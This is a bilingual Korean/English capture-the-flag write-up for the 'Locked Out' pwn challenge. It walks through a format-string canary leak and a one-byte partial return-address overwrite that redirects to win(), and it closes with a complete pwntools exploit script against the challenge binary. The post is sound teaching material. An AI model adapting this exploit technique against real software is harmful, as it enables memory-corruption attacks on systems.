---
title: "[BrunnerCTF 2026] Locked Out"
subtitle: "Pwn / Locked Out"
date: 2026-08-23 00:00:00 +0900
last_modified_at: 2026-08-24 05:12:18 +0900
category: ctf
group: ctf
# langs 가 있으면 글 상단에 한/영 토글이 생깁니다. (맨 앞이 기본 언어)
# 한 언어로만 쓸 거면 이 줄을 지우고 본문에서 <!--ko--> / <!--en--> 구분자도 빼면 됩니다.
langs: [ko, en]
tags: ["BrunnerCTF 2026", "pwn", "format string", "canary leak", "buffer overflow", "PIE", "partial overwrite"]
---
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-39-08.png)

---

<!--ko-->

## 보호 기법 확인

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-11-40.png)
checksec으로 확인하면 Partial RELRO, 스택 카나리, NX, PIE가 모두 걸려 있다.

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-12-02.png)
프로그램을 실행하면 PIN을 입력받고, 틀리면 다시 묻는다. 총 4번의 기회가 주어진다.

## 소스 코드 분석

`play()` 함수를 IDA로 살펴봤다. (main은 play()만 호출하고 특별한 건 없다.)

```c
unsigned __int64 play() {
    unsigned int v0;
    char s[8];         // [rsp+Ch] [rbp-14h]
    int v3;            // [rsp+14h] [rbp-Ch]  → 시도 횟수 카운터
    unsigned __int64 v4; // [rsp+18h] [rbp-8h] → 카나리

    v4 = __readfsqword(0x28u);
    v3 = 4;
    v0 = time(nullptr);
    srand(v0);
    pincode = rand() % 10000;

    while ( v3 > 0 ) {
        memset(s, 0, 5u);
        printf("Please enter PIN: ");
        read(0, s, 0x20u);   // 8바이트 버퍼에 32바이트를 읽어들임
        s[4] = 0;            // 포맷 스트링을 4글자로 제한
        if ( atoi(s) == pincode ) {
            puts("Correct! Door is unlocked.");
            return v4 - __readfsqword(0x28u);
        }
        --v3;
        printf(s);           // 포맷 스트링 취약점
        printf(" is wrong! %d tries left.\n\n", v3);
    }
    return v4 - __readfsqword(0x28u);
}
```

숨겨진 `win()` 함수도 존재한다.

```c
unsigned __int64 win() {
    FILE *stream;
    char s[72];
    unsigned __int64 v4;

    v4 = __readfsqword(0x28u);
    stream = fopen("flag.txt", "r");
    for ( char i = fgets(s, 64, stream); i; i = fgets(s, 64, stream) )
        printf("%s", s);
    fclose(stream);
    return v4 - __readfsqword(0x28u);
}
```

---

## 취약점 분석

```c
read(0, s, 0x20u);
```

8바이트 버퍼 `s`에 32바이트를 읽어들이므로 버퍼 오버플로우가 발생한다.

```c
s[4] = 0;
printf(s);
```

입력값이 그대로 포맷 스트링으로 쓰인다. 다만 `s[4] = 0` 때문에 포맷 스트링은 4글자로 제한된다. (`%9$p`까지만 사용 가능.)

---

## 익스플로잇 설계

보호 기법이 여러 개 걸려 있어 아래 순서로 접근했다.

**1단계: 스택 카나리 릭**

카나리가 켜져 있으므로 오버플로우 전에 카나리 값을 먼저 알아내야 한다.
포맷 스트링 취약점으로 `%N$p`를 써서 스택 값을 하나씩 읽을 수 있다.

처음엔 gdb에서 테스트했는데, gdb는 스택에 환경 변수를 추가로 올려서 레이아웃이 바뀐다. 그래서 gdb에서 찾은 인덱스가 실제 실행과 달랐다. 게다가 `s[4] = 0` 제약 때문에 탐색 범위는 `%1$p`부터 `%9$p`까지, 후보가 9개뿐이다. (`%10$p`부터는 문자열이 5글자가 되어 5번째 바이트가 `\0`이 되고, printf가 널에서 멈춘다.)

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-16-16.png)
하나씩 테스트한 결과 <strong>`%9$p`</strong>가 카나리 값을 반환하는 것을 확인했다. 카나리는 항상 `0x~~00`으로 끝나는 성질, 그리고 실행할 때마다 값이 바뀌는 점으로 카나리임을 판별했다.

**2단계: PIE 우회 (Partial Overwrite)**

PIE가 켜져 있어 전체 주소를 알 수 없다. 포맷 스트링으로 PIE 주소를 릭하려 했지만, `s[4] = 0` 제약 안의 인덱스 범위에서는 PIE 주소를 찾을 수 없었다.

그래서 다른 방법을 썼다.

PIE 베이스는 항상 0x1000 단위로 정렬된다. 즉 어떤 주소든 하위 12비트(1.5바이트)는 항상 0이다.

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-26-21.png)![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-26-00.png)

- `win()` 오프셋: `0x13da` (IDA로 확인)
- 현재 리턴 주소: `0x13BF` (`call play` 바로 다음 명령어)

두 주소의 하위 2바이트를 비교하면:

- 리턴 주소: `~~13bf`
- `win()`: `~~13da`

**최하위 1바이트만 다르다.** (`0xbf` vs `0xda`)
따라서 리턴 주소의 1바이트만 `0xda`로 덮으면 실행 흐름이 `win()`으로 넘어간다. PIE 주소를 몰라도 된다.

**3단계: 루프 탈출 문제**

오버플로우 페이로드를 보내면 `v3`(시도 횟수 카운터)도 같이 덮인다. `v3`가 `0x41414141` 같은 큰 값이 되면 루프가 끝나지 않아 `ret`에 도달하지 못한다.

해결: `v3` 위치에 `p32(1)`을 넣는다. 그러면 `--v3 = 0`이 되어 `while(0 > 0)`이 거짓이 되고 루프를 자연스럽게 빠져나온다.

**스택 레이아웃**
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-38-19.png)

```
[rbp-0x14] s (8 bytes) ← 버퍼 시작
[rbp-0x0C] v3 (4 bytes) ← 시도 횟수 카운터
[rbp-0x08] canary (8 bytes)
[rbp+0x00] saved rbp
[rbp+0x08] return address

최종 페이로드 구조:
[A*8] [p32(1)] [canary] [p64(0)] [0xda]
s     v3=1     canary   saved_rbp  ret
```

---

## 익스플로잇

```python
from pwn import *

p = process('./locked_out')
context.arch = 'amd64'

# 1단계: 카나리 릭
p.sendlineafter(b"PIN: ", b"%9$p")
line = p.recvline()
canary = int(line.split()[0], 16)
print(f"canary: {hex(canary)}")

# 2단계: 오버플로우
# s(8) + v3=1(4) + canary(8) + saved_rbp(8) + ret 최하위 1바이트
payload = b"A" * 8 + p32(1) + p64(canary) + p64(0) + p8(0xda)

p.sendafter(b"PIN: ", payload)
p.interactive()
```

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-40-14.png)

<!--en-->

## Check security techniques

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-11-40.png)
Running checksec reveals that Partial RELRO, Stack Canary, NX, and PIE are all enabled.

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-12-02.png)
When the program runs, it prompts for a PIN. If incorrect, it asks again. A total of 4 attempts are given.

## Source Code Check

The `play()` function was examined using IDA. (The main function only calls play() with nothing else notable.)

```c
unsigned __int64 play() {
    unsigned int v0;
    char s[8];         // [rsp+Ch] [rbp-14h]
    int v3;            // [rsp+14h] [rbp-Ch]  → attempt counter
    unsigned __int64 v4; // [rsp+18h] [rbp-8h] → canary

    v4 = __readfsqword(0x28u);
    v3 = 4;
    v0 = time(nullptr);
    srand(v0);
    pincode = rand() % 10000;

    while ( v3 > 0 ) {
        memset(s, 0, 5u);
        printf("Please enter PIN: ");
        read(0, s, 0x20u);   // reading 32 bytes into an 8-byte buffer
        s[4] = 0;            // limits format string to 4 characters
        if ( atoi(s) == pincode ) {
            puts("Correct! Door is unlocked.");
            return v4 - __readfsqword(0x28u);
        }
        --v3;
        printf(s);           // format string vulnerability
        printf(" is wrong! %d tries left.\n\n", v3);
    }
    return v4 - __readfsqword(0x28u);
}
```

A hidden `win()` function also exists.

```c
unsigned __int64 win() {
    FILE *stream;
    char s[72];
    unsigned __int64 v4;

    v4 = __readfsqword(0x28u);
    stream = fopen("flag.txt", "r");
    for ( char i = fgets(s, 64, stream); i; i = fgets(s, 64, stream) )
        printf("%s", s);
    fclose(stream);
    return v4 - __readfsqword(0x28u);
}
```

---

## Discovered Vulnerabilities

```c
read(0, s, 0x20u);
```

Reading 32 bytes into the 8-byte buffer `s` causes a buffer overflow.

```c
s[4] = 0;
printf(s);
```

The input is used directly as a format string. However, `s[4] = 0` limits the format string to 4 characters. (Only up to `%9$p` is usable.)

---

## Exploit Plan

Multiple protections are in place, so the following approach was taken.

**Step 1: Stack Canary Leak**

Since a canary is enabled, the canary value must be obtained before overflowing.
The format string vulnerability can be used to read stack values one by one using `%N$p`.

Initial testing was done in gdb, but gdb adds extra environment variables onto the stack, changing its layout. As a result, the index found in gdb differed from normal execution. Additionally, the `s[4] = 0` constraint limits the search range to `%1$p` through `%9$p` — only 9 candidates. (From `%10$p` onward, the string is 5 characters long, the 5th byte becomes `\0`, and printf stops at null.)

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-16-16.png)
After testing each one, **`%9$p`** was confirmed to return the canary value. It was identified by the property that canaries always end in `0x~~00`, and repeated runs showed the value changing each time, confirming it is the canary.

**Step 2: PIE Bypass (Partial Overwrite)**

PIE is enabled, so the full address cannot be known. Leaking the PIE address via format string was attempted, but no PIE address could be found within the reachable index range due to the `s[4] = 0` constraint.

A different approach was used instead.

The PIE base is always aligned to a multiple of 0x1000. This means the lower 12 bits (1.5 bytes) of any address are always 0.

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-26-21.png)![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-26-00.png)

- `win()` offset: `0x13da` (confirmed via IDA)
- Current return address: `0x13BF` (the instruction immediately after `call play`)

Comparing the lower 2 bytes of both addresses:

- Return address: `~~13bf`
- `win()`: `~~13da`

**Only the lowest 1 byte differs.** (`0xbf` vs `0xda`)
Therefore, overwriting just 1 byte of the return address with `0xda` redirects execution to `win()`. No knowledge of the PIE address is needed.

**Step 3: Loop Escape Problem**

Sending the overflow payload also overwrites `v3` (the attempt counter). If `v3` becomes a large value like `0x41414141`, the loop never ends and `ret` is never reached.

Solution: place `p32(1)` at the `v3` position. This makes `--v3 = 0`, causing `while(0 > 0)` to evaluate as false and the loop exits naturally.

**Stack Layout**
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-38-19.png)

```
[rbp-0x14] s (8 bytes) ← buffer start
[rbp-0x0C] v3 (4 bytes) ← attempt counter
[rbp-0x08] canary (8 bytes)
[rbp+0x00] saved rbp
[rbp+0x08] return address

Final payload structure:
[A*8] [p32(1)] [canary] [p64(0)] [0xda]
s     v3=1     canary   saved_rbp  ret
```

---

## Exploit

```python
from pwn import *

p = process('./locked_out')
context.arch = 'amd64'

# Step 1: Canary leak
p.sendlineafter(b"PIN: ", b"%9$p")
line = p.recvline()
canary = int(line.split()[0], 16)
print(f"canary: {hex(canary)}")

# Step 2: Overflow
# s(8) + v3=1(4) + canary(8) + saved_rbp(8) + lowest 1 byte of ret
payload = b"A" * 8 + p32(1) + p64(canary) + p64(0) + p8(0xda)

p.sendafter(b"PIN: ", payload)
p.interactive()
```

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-03-40-14.png)
